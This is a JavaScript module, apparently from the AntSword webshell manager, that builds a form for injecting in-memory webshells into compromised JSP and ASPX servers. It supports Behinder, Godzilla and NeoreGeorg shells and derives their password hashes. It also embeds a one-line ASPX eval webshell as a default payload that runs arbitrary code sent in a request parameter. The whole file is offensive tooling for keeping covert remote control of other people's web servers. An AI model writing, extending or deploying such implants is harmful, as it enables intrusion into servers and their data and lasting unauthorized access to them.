"use strict";
const Base = require("../base");
const LANG = require("../../language"); // 插件语言库
const crypto = require("crypto");
// 内存shell模块
class MemShellInject extends Base {
  createForm(cell) {
    switch (this.shelltype) {
      case "jsp":
        var str = [
          { type: "settings", labelWidth: 150, inputWidth: 200 },
          {
            type: "radio",
            name: "service_type",
            label: "Servlet",
            checked: "1",
            value: "Servlet",
            position: "label-right",
            list: [
              {
                type: "select",
                name: "Servlet_type",
                label: LANG["core"]["memshell_inject"]["form"]["shell_type"],
                inputWidth: 200,
                options: [
                  { value: "AntSword", text: "AntSword" },
                  { value: "Behinder", text: "Behinder" },
                  { value: "GodzillaBase64", text: "Godzilla-Base64" },
                  { value: "NeoreGeorg", text: "NeoreGeorg" },
                ],
              },
            ],
          },
          {
            type: "radio",
            name: "service_type",
            label: "Filter",
            checked: "0",
            value: "Filter",
            position: "label-right",
            list: [
              {
                type: "select",
                name: "Filter_type",
                label: LANG["core"]["memshell_inject"]["form"]["shell_type"],
                inputWidth: 200,
                options: [
                  { value: "AntSword", text: "AntSword" },
                  { value: "Behinder", text: "Behinder" },
                  { value: "GodzillaBase64", text: "Godzilla-Base64" },
                  { value: "NeoreGeorg", text: "NeoreGeorg" },
                ],
              },
            ],
          },
          { type: "newcolumn" },
          {
            type: "block",
            name: "form_block",
            offsetLeft: "25",
            offsetTop: "10",
            list: [
              {
                type: "input",
                name: "ServiceName",
                label: LANG["core"]["memshell_inject"]["form"]["ServiceName"],
                required: true,
              },
              {
                type: "input",
                name: "UrlPath",
                label: LANG["core"]["memshell_inject"]["form"]["UrlPath"],
                required: true,
              },
              {
                type: "input",
                name: "ShellPass",
                label: LANG["core"]["memshell_inject"]["form"]["ShellPass"],
                required: true,
              },
              {
                type: "input",
                name: "SecretKey",
                label: LANG["core"]["memshell_inject"]["form"]["SecretKey"],
              },
            ],
          },
        ];
        break;
      case "aspx":
        var str = [
          { type: "settings", labelWidth: 100, inputWidth: 200 },
          {
            type: "radio",
            name: "service_type",
            label: "VirtualPathProvider",
            checked: "1",
            value: "VirtualPathProvider",
            position: "label-right",
          },
          {
            type: "block",
            name: "form_block",
            list: [
              {
                type: "input",
                name: "UrlPath",
                label: LANG["core"]["memshell_inject"]["form"]["UrlPath"],
                required: true,
              },
              {
                type: "input",
                name: "Content",
                label: LANG["core"]["memshell_inject"]["form"]["Content"],
                rows: "1",
                inputWidth: 300,
                inputHeight: 150,
                required: true,
                value: `<%@ Page Language="Jscript"%><%eval(Request.Item["ant"],"unsafe");%>`
              },
            ],
          },
        ];
        break;
    }

    var form = cell.attachForm(str);
    this.form = form;
  }
  getArgs() {
    let args = {};
    let service_type = this.form.getCheckedValue("service_type"); //内存马种类
    let shell_type = this.form.getItemValue(service_type + "_type"); //打入什么内存马
    args["UrlPath"] = this.form.getItemValue("UrlPath");
    switch (this.shelltype) {
      case "jsp":
        args["ServiceName"] = this.form.getItemValue("ServiceName");
        switch (shell_type) {
          case "AntSword":
            args["ShellPass"] = this.form.getItemValue("ShellPass");
            break;
          case "Behinder":
            let ShellPass = crypto
              .createHash("md5")
              .update(this.form.getItemValue("ShellPass"))
              .digest("hex")
              .substr(0, 16);
            args["ShellPass"] = ShellPass; // 冰蝎3.x的密码为明文md5后的前16位
            break;
          case "GodzillaBase64":
            args["ShellPass"] = this.form.getItemValue("ShellPass");
            let key = this.form.getItemValue("SecretKey");
            let SecretKey = crypto
              .createHash("md5")
              .update(key)
              .digest("hex")
              .substr(0, 16); // 哥斯拉的key是明文md5处理后前16位
            args["SecretKey"] = SecretKey;
            break;
          case "NeoreGeorg":
            args["ShellPass"] = this.form.getItemValue("ShellPass"); // 额外密码，如果没有收到额外密码则继续filterChain
            break;
          default:
            break;
        }
        this.payloadtype = shell_type + service_type;
        break;
      case "aspx":
        this.parammode = 2;
        this.payloadtype = service_type;
        args["content"] = Buffer.from(this.form.getItemValue("Content")).toString("base64");
        args["path"] = this.form.getItemValue("UrlPath");

        break;
      default:
        break;
    }

    // console.log(args);

    return args;
  }
}

module.exports = MemShellInject;
